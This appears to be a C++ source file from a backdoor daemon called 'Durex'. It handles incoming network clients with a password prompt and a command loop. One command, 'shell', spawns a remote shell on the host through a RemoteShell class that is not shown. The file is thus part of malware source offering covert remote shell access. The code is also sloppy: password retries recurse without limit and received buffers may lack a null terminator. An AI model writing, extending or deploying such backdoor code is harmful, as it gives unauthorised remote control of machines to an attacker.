#include "Client.hpp"
#include "Server.hpp"

Client::Client ( int fd, struct sockaddr_in	&in, Server *server)
{
	this->fd = fd;
	this->in = in;
	this->address = inet_ntoa(this->in.sin_addr);
	this->server = server;

	std::thread thread(Client::clientThread, this);
	thread.detach();
}

std::string Client::getAddress()
{
	return this->address;
}

Client::Client ( Client const & src )
{
	*this = src;
	return ;
}

Client &				Client::operator=( Client const & rhs )
{
	if (this != &rhs)
	{
	}
	return (*this);
}

Client::~Client ( void )
{
	return ;
}

std::ostream &				operator<<(std::ostream & o, Client const & i)
{
	(void)i;
	return (o);
}

bool Client::authenticateClient()
{
	char buffer[CLIENT_BUFFER];

	memset(&buffer, 0, CLIENT_READ);
	std::string welcome_message = "Please enter the password to access to the daemon:\n";
	send(this->fd, welcome_message.c_str(), welcome_message.length(), 0);
	int res = recv(this->fd, buffer, CLIENT_READ, 0);
	if (res > 0) {
		std::string password = this->server->getPassword();
		std::string buf = std::string(buffer);
		if (buf[buf.length() - 1] == '\n')
			buf[buf.length() - 1] = '\0';
		if (!strcmp(buf.c_str(), password.c_str())) {
			std::string answer = "Password correct ! Welcome master\n";
			send(this->fd, answer.c_str(), answer.length(), 0);
			return true;
		} else {
			std::string answer = "Incorrect password, please try again\n";
			send(this->fd, answer.c_str(), answer.length(), 0);
			return this->authenticateClient();
		}
	} else if (res <= 0) {
		this->server->removeClient(this);
	}
	return false;
}

void Client::printPrompt(bool new_line)
{
	std::string print = (new_line) ? "\n" : "";
	print += "$> ";
	send(this->fd, print.c_str(), print.length(), 0);
}


void Client::clientThread(Client *client)
{
	char buffer[CLIENT_BUFFER];
	int res = 0;

	memset(&buffer, 0, CLIENT_READ);
	if (client->authenticateClient()) {
		client->printPrompt(true);
		while (true)
		{
			res = recv(client->fd, buffer, CLIENT_READ, 0);
			if (res) {
				std::string entry = buffer;
				if (entry[entry.size() - 1] == '\n')
					entry[entry.size()- 1] = '\0';
				if (!strcmp(entry.c_str(), "help")) {
					std::string message = "shell - Spawn a shell from the remote server\nquit - Exit and close Durex\n";
					send(client->fd, message.c_str(), message.length(), 0);
				} else if (!strcmp(entry.c_str(), "shell")) {
					RemoteShell remote(client);
				}
				else if (!strcmp(entry.c_str(), "quit")) {
					exit(0);
				}
				if ((strchr(buffer, '\n')) != NULL) {
					client->printPrompt(false);
				} else {
					client->printPrompt(true);
				}
				memset(&buffer, 0, CLIENT_READ);
			} else if (res <= 0) {
				client->server->removeClient(client);
				break;
			}
		}
		client->server->removeClient(client);
		close(client->fd);
	}
}
